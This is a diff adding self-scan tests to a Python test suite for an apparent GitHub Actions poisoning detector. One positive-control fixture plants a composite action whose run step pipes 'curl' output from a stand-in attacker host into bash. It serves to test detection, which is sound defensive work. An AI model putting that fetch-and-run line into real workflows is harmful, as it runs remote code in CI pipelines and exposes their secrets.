@@ -3214,5 +3214,116 @@ class TestAIToolingConfigPoisoning(unittest.TestCase):
         self.assertEqual(v["severity_score"], 0)
 
 
+# ==============================================================================
+# Dogfooding: the analyser must return clean on its own workflow and action files
+# ==============================================================================
+
+
+def _own_ci_files():
+    """Yield (real_path, content) for every workflow and action definition here.
+
+    Deliberately independent of _ACTIONS_WORKFLOW_PATTERN. That filter requires
+    the file to sit directly under .github/workflows/ or .github/actions/, so it
+    misses a repo-root action.yml and the conventional
+    .github/actions/<name>/action.yml. A self-scan built on the filter would skip
+    exactly the files that motivate it and pass while seeing nothing.
+    """
+    import glob
+
+    root = os.path.dirname(os.path.abspath(__file__))
+    patterns = [
+        ".github/workflows/*.yml",
+        ".github/workflows/*.yaml",
+        "action.yml",
+        "action.yaml",
+        ".github/actions/**/action.yml",
+        ".github/actions/**/action.yaml",
+    ]
+    seen = set()
+    for pat in patterns:
+        for path in sorted(glob.glob(os.path.join(root, pat), recursive=True)):
+            rel = os.path.relpath(path, root)
+            if rel in seen:
+                continue
+            seen.add(rel)
+            with open(path, encoding="utf-8") as fh:
+                yield rel, fh.read()
+
+
+class TestAnalyserScansItselfClean(unittest.TestCase):
+    """Standing control for the class of defect that only self-scanning finds.
+
+    NF-1 (template injection in this project's own action) and NF-18 (composite
+    actions outside the L2c path filter) were both found by pointing the analyser
+    at its own repository, which had never been done. This keeps that pointed.
+
+    Scope note: this asserts the absence of L2c *poisoning* signals. The separate
+    template-injection property is guarded by its own test, since it concerns
+    expression handling in run: bodies rather than payload detection.
+    """
+
+    def _scan_as_workflow(self, analyzer, real_path, content):
+        """Run L2c over one file, bypassing the path filter (see NF-18)."""
+        d = MagicMock()
+        d.change_type = "A"
+        alias = ".github/workflows/" + real_path.replace("/", "__")
+        if not alias.endswith((".yml", ".yaml")):
+            alias += ".yml"
+        d.b_path = alias
+        d.a_path = alias
+        d.b_blob.data_stream.read.return_value = content.encode()
+        return analyzer._scan_github_actions_poisoning([d])
+
+    def test_own_ci_files_produce_no_poisoning_signals(self):
+        analyzer = _make_analyzer()
+        offenders = []
+        for rel, content in _own_ci_files():
+            for flag in self._scan_as_workflow(analyzer, rel, content):
+                offenders.append(
+                    f"{rel}: {flag['severity']} {[s['type'] for s in flag['signals']]}"
+                )
+        self.assertEqual(
+            offenders,
+            [],
+            "PayloadGuard reports poisoning signals on its own CI definitions:\n  "
+            + "\n  ".join(offenders),
+        )
+
+    def test_self_scan_actually_reads_the_files(self):
+        """Without this the scan above passes by finding nothing."""
+        found = {rel for rel, _ in _own_ci_files()}
+        self.assertGreater(len(found), 3, f"self-scan collected too few files: {found}")
+        self.assertIn("action.yml", found, "the composite action itself must be scanned")
+        self.assertTrue(
+            any(f.startswith(".github/workflows/") for f in found),
+            f"no workflow files collected: {found}",
+        )
+
+    def test_self_scan_would_catch_a_planted_payload(self):
+        """Positive control: the scan must fail on a file it should reject.
+
+        A clean result is only meaningful if a dirty file would have been caught,
+        including at a path the production filter does not currently cover (NF-18).
+        """
+        analyzer = _make_analyzer()
+        planted = (
+            "name: Build helper\n"
+            "description: builds the project\n"
+            "runs:\n"
+            "  using: composite\n"
+            "  steps:\n"
+            "    - shell: bash\n"
+            "      run: curl -s https://evil.example/p.sh | bash\n"
+        )
+        flags = self._scan_as_workflow(
+            analyzer, ".github/actions/build-helper/action.yml", planted
+        )
+        self.assertTrue(flags, "planted payload was not detected — the scan is vacuous")
+        self.assertEqual(flags[0]["severity"], "CRITICAL")
+        self.assertIn(
+            "workflow_remote_code_execution", [s["type"] for s in flags[0]["signals"]]
+        )
+
+
 if __name__ == "__main__":
     unittest.main()
